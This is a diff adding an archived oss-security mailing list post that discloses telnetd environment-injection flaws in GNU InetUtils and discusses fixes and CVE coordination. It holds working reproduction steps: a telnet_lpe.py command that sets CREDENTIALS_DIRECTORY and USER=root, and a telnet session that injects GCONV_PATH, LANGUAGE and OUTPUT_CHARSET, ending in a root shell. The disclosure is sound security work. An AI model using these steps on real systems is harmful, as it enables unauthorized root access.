@@ -1,0 +1,321 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - Re: Telnetd Vulnerability Report</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="1">[&lt;prev]</a> <a href="3">[next&gt;]</a> <a href="1">[&lt;thread-prev]</a> <a href="3">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;20260224052943.GA13045&#64;openwall.com&gt;
+Date: Tue, 24 Feb 2026 06:29:43 +0100
+From: Solar Designer &lt;solar&#64;...nwall.com&gt;
+To: Justin Swartz &lt;justin.swartz&#64;...ingedge.co.za&gt;
+Cc: bug-inetutils&#64;....org, oss-security&#64;...ts.openwall.com,
+	ron.benyizhak&#64;...ebreach.com, simon&#64;...efsson.org,
+	auerswal&#64;...x-ag.uni-kl.de
+Subject: Re: Telnetd Vulnerability Report
+
+Hi,
+
+Thank you for bringing this to oss-security, Justin!
+
+On Tue, Feb 24, 2026 at 03:17:02AM +0200, Justin Swartz wrote:
+&gt; I have been reviewing the recent vulnerability report by Ron Ben Yizhak regarding CREDENTIALS_DIRECTORY, as well as commit 4db2f19f which introduces unsetenv("CREDENTIALS_DIRECTORY") to address the problem.
+
+Looks like this wasn't reported to oss-security yet, so let me do that
+now.  Ron Ben Yizhak's report is here:
+
+<a href="https://lists.gnu.org/archive/html/bug-inetutils/2026-02/msg00000.html" rel="nofollow">https://lists.gnu.org/archive/html/bug-inetutils/2026-02/msg00000.html</a>
+
+and I quote it in full below:
+
+&gt; From: 	Ron Ben Yizhak
+&gt; Subject: 	Telnetd Vulnerability Report
+&gt; Date: 	Thu, 5 Feb 2026 14:39:57 +0200
+&gt; 
+&gt; Hello,
+&gt; 
+&gt; My name is Ron Ben Yizhak and I am a security researcher from SafeBreach.
+&gt; 
+&gt; I want to report a severe vulnerability that I found in telnetd from the repository <a href="https://codeberg.org/inetutils/inetutils" rel="nofollow">https://codeberg.org/inetutils/inetutils</a>
+&gt; 
+&gt; After the vulnerability CVE-2026-24061 was fixed, it was no longer possible to force telnetd to execute /usr/bin/login with the parameter -f and skip the authentication. However the research on CVE-2026-24061 revealed that telnetd allows clients to set environment variables for the telnetd process itself and for all its sub processes. One of its processes as we know from CVE-2026-24061, is /usr/bin/login.
+&gt; 
+&gt; This is the root cause of the vulnerability I’m reporting to you. Setting environment variables as a remote telnet client enables us to spawn /usr/bin/login with the environment variable “CREDENTIALS_DIRECTORY”. This will make the process search for a file named “login.noauth” in the directory specified by “CREDENTIALS_DIRECTORY”. If the file contains the string “yes”, login will skip the authentication and provide a shell for the client running as the user the client specified. It can be any user, even root.
+&gt; 
+&gt; <a href="https://github.com/util-linux/util-linux/blob/master/login-utils/login.c#L1306" rel="nofollow">https://github.com/util-linux/util-linux/blob/master/login-utils/login.c#L1306</a>
+&gt; 
+&gt; Attached to this mail is a video demonstrating the vulnerability on a fully patched ubuntu 25 machine with the latest telnetd. Also attached is a script to test this vulnerability
+&gt; 
+&gt; Usage:
+&gt; 
+&gt; 1. create a directory as a low privileged user, for example /home/weak_user/fake_cred
+&gt; 
+&gt; 2. create a file named login.noauth containing the string “yes” inside this directory
+&gt; 
+&gt; 3. launch the python script with the following parameters
+&gt; 
+&gt; ./telnet_lpe.py 127.0.0.1 --env CREDENTIALS_DIRECTORY=/home/weak_user/fake_cred --env USER=root
+&gt; 
+&gt; Best regards,
+&gt; Ron Ben Yizhak
+&gt; 
+&gt; Attachment: telnet_lpe.py
+&gt; Description: Text Data
+&gt; 
+&gt; Attachment: telnet_lpe_demo.mp4
+&gt; Description: video/mp4
+
+I'm re-attaching telnet_lpe.py, but not the video.
+
+On Tue, Feb 24, 2026 at 03:17:02AM +0200, Justin Swartz wrote:
+&gt; After becoming aware of CVE-2026-24061 (telnetd in GNU Inetutils through 2.7 allows remote authentication bypass via a "-f root" value for the USER environment variable), I was curious to find out whether there'd also been a potential regression of CVE-1999-0073, described as: telnet allows a remote client to specify environment variables including LD_LIBRARY_PATH, allowing an attacker to bypass the normal system libraries and gain root access. I can confirm that this is still an issue 27 years later, despite attempts at blacklisting environment variables by prefix or full name.
+&gt; 
+&gt; The problem stems from telnetd executing /bin/login in a root-to-root context, which means that AT_SECURE is set to 0 by the kernel in the process's auxiliary vector. When AT_SECURE holds a positive value, it informs the dynamic linker (ld-linux.so) and libc to enter a "secure-execution mode" where a bunch of interesting environment variables are discarded or, at least, defanged if present. In other words, the responsibility is on telnetd itself to ensure that none of those potentially interesting, and attacker controlled, variables make their way to /bin/login.
+&gt; 
+&gt; While using unsetenv() negates a user's ability to exploit the login.noauth vector, the possibility still exists for the inclusion of variables of interest to GNU gettext (such as OUTPUT_CHARSET or LANGUAGE) and glibc (such as GCONV_PATH) via the telnet protocol itself.
+&gt; 
+&gt; For example, by injecting OUTPUT_CHARSET and LANGUAGE, an attacker can persuade gettext that a character set conversion is necessary. This forces gettext to call libc's iconv_open(), and because AT_SECURE is 0, iconv_open() will use an injected GCONV_PATH in its quest for a gconv-modules file. Assuming the attacker already has a local unprivileged account, or at least a means of uploading files to the host (and knowing the location of the uploaded files), a custom gconv-modules file will allow arbitrary shared objects to be loaded soon after /bin/login attempts to print a localized prompt.
+&gt; 
+&gt; For proof of concept, I've declared a broad selection of LANGUAGE codes for the best chance of matching an installed locale. An attacker with local access could simply determine what's actually installed and select only one that doesn't match the system's default locale instead. Similarly, OUTPUT_CHARSET has been chosen as a deliberate mismatch against the very common choice of UTF-8:
+&gt; 
+&gt;   abuser&#64;...specton.hyperama:~$ ls -al .gconv
+&gt;   total 184
+&gt;   drwxr-xr-x 2 abuser abuser   4096 Jan  1  1970 .
+&gt;   drwxr-x--- 5 abuser abuser  36864 Jan  1  1970 ..
+&gt;   -rw-r--r-- 1 abuser abuser    256 Jan  1  1970 gconv-modules
+&gt;   -rw-r--r-- 1 abuser abuser  15568 Jan  1  1970 libcash2trash.so
+&gt; 
+&gt; 
+&gt;   abuser&#64;...specton.hyperama:~$ telnet -l abuser
+&gt;   telnet&gt; environ define GCONV_PATH /home/abuser/.gconv
+&gt;   telnet&gt; environ export GCONV_PATH
+&gt;   telnet&gt; environ define LANGUAGE fr:de:es:it:pt:nl:sv:pl:uk:ru:zh_CN:ko:ja
+&gt;   telnet&gt; environ export LANGUAGE
+&gt;   telnet&gt; environ define OUTPUT_CHARSET ISO-8859-1
+&gt;   telnet&gt; environ export OUTPUT_CHARSET
+&gt;   telnet&gt; open 127.0.0.1
+&gt;   Trying 127.0.0.1...
+&gt;   Connected to 127.0.0.1.
+&gt;   Escape character is '^]'.
+&gt;   
+&gt;   Linux (localhost) (pts/6)
+&gt;   
+&gt;   Connection closed by foreign host.
+&gt; 
+&gt; 
+&gt;   abuser&#64;...specton.hyperama:~$ ls -al .gconv
+&gt;   total 184
+&gt;   drwxr-xr-x 2 abuser abuser   4096 Jan  1  1970 .
+&gt;   drwxr-x--- 5 abuser abuser  36864 Jan  1  1970 ..
+&gt;   -rw-r--r-- 1 abuser abuser    256 Jan  1  1970 gconv-modules
+&gt;   -rw-r--r-- 1 abuser abuser  15568 Jan  1  1970 libcash2trash.so
+&gt;   -rwsr-sr-x 1 root   root   125640 Jan  1  1970 trash
+&gt; 
+&gt; 
+&gt;   abuser&#64;...specton.hyperama:~$ .gconv/trash -p
+&gt;   # id
+&gt;   uid=1001(abuser) gid=1002(abuser) euid=0(root) egid=0(root) groups=0(root),1002(abuser)
+&gt; 
+&gt; 
+&gt; Once the telnet connection opens, /bin/login tries to print the localized prompt but gettext recognizes the encoding mismatch and calls iconv_open() to parse the gconv-modules file in the directory referenced by the injected path before loading the shared object that turns cash ($) to trash (#). The connection drops because I included a call to exit() once the payload has executed. As illustrated above, the payload effectively asserts root privilege and makes a copy of /bin/sh with SUID/SGID permissions. Note that no authentication via telnetd was required, nor performed, for this privilege escalation trick to occur. Also note that this is just one of many possible methods that may be used to exploit this condition.
+&gt; 
+&gt; In my opinion, to fix this issue and finally put the ghost of CVE-1999-0073 to rest: telnetd must drop the blacklist approach and adopt the OpenSSH AcceptEnv-style approach suggested by Simon Josefsson [1], which amounts to preparing a brand new environment for /bin/login based on a strict whitelist of variables names considered to be "safe", and perhaps a healthy dose of input sanitization for their respective values.
+
+Oh, sure.  A couple of decades ago I ported OpenBSD's telnet and telnetd
+to Linux for our distro, Owl.  I no longer recalled all detail, but
+looking at my "Linux port" patch now, it appears to implement a strict
+allow-list approach already.  There's a comment saying the "list comes
+from Linux NetKit telnetd, version 0.17", so maybe NetKit already used
+that approach too, and Linux distros got a regression by switching from
+NetKit to InetUtils?  Or it could be that Red Hat used NetKit and Debian
+went with InetUtils.  I see I'm also lightly sanitizing env var values
+(only for not containing '/' and being of sane length), which I doubt
+was in NetKit.
+
+My very first RPM changelog entry was:
+
+* Sat Nov 17 2001 Solar Designer &lt;solar-at-owl.openwall.com&gt;
+- Ported the telnet client and server from OpenBSD-current (post-3.0),
+reviewing changes made in NetBSD-current, FreeBSD-current, and Linux
+NetKit 0.17.
+- Filter environment variables in telnetd with a white list (took the
+list itself from NetKit), but also use a black list for logging likely
+attacks.
+- Dropped the "mini inetd" from telnetd.
+- Dropped Kerberos-related pieces from the man pages (the telnet stuff
+is already bad enough, let's better not add to that).
+- Wrote telnetd.xinetd.
+- Wrote this spec file, based (sub)package descriptions on Red Hat's.
+
+So at least OpenBSD was at risk, relying on their badenv_table being
+comprehensive.  Probably other *BSDs too.
+
+Perhaps non-Linux systems that still have telnetd also still have this
+weakness, and you could find specific env vars/values that would work
+for them?
+
+There was also a symmetric problem where a malicious server could
+request arbitrary env vars from the telnet client, obtaining sensitive
+information.  This too was promptly fixed in my port:
+
+* Wed Nov 21 2001 Solar Designer &lt;solar-at-owl.openwall.com&gt;
+[...]
+- Added a Red Hat Linux derived patch to the telnet client such that it
+permits queries for exported variables only.
+
+... so apparently it had been fixed in Red Hat Linux, but not *BSDs.
+
+Further, I implemented privsep:
+
+* Sun Nov 25 2001 Solar Designer &lt;solar-at-owl.openwall.com&gt;
+- Do telnet protocol handling as a dedicated pseudo-user and in a chroot
+jail.  This uses the approach introduced by Chris Evans in his NetKit
+telnetd patches, but the code is different.
+
+Architecture diagram:
+
+<a href="https://www.openwall.com/presentations/Owl/mgp00017.html">https://www.openwall.com/presentations/Owl/mgp00017.html</a>
+
+Patches against OpenBSD telnet/telnetd:
+
+<a href="https://github.com/openwall/Owl/tree/main/packages/telnet" rel="nofollow">https://github.com/openwall/Owl/tree/main/packages/telnet</a>
+
+Tarball with the OpenBSD code to be patched:
+
+<a href="https://download.openwall.net/pub/Owl/pool/sources/telnet/">https://download.openwall.net/pub/Owl/pool/sources/telnet/</a>
+
+This can be revitalized and used to replace the code currently in
+InetUtils if anyone is willing to invest significant time into that.
+
+&gt; In terms of the CVE that Ron Ben Yizhak had asked about earlier in the thread: I think it might make the most sense to co-ordinate a single CVE for "Improper environment sanitization in telnetd" that comprehensively covers both the CREDENTIALS_DIRECTORY vector and this dynamic linker escape.
+
+So essentially a new CVE for improper/incomplete fix of CVE-1999-0073,
+emphasizing that only an allow list is considered a proper fix of the
+new CVE.  Makes sense to me.
+
+&gt; I'm happy to share the intentionally redacted payload privately with the maintainers should any help be required to reproduce the proof of concept.
+&gt; 
+&gt; Regards,
+&gt; Justin
+&gt; 
+&gt; ---
+&gt; 
+&gt; [1] <a href="https://lists.gnu.org/archive/html/bug-inetutils/2026-02/msg00002.html" rel="nofollow">https://lists.gnu.org/archive/html/bug-inetutils/2026-02/msg00002.html</a>
+
+Thank you both for taking a fresh look and sharing these findings.
+
+Alexander
+
+<span style="font-family: times;"><strong>View attachment "</strong><a href="2/1">telnet_lpe.py</a><strong>" of type "</strong>text/plain<strong>" (7789 bytes)</strong></span>
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
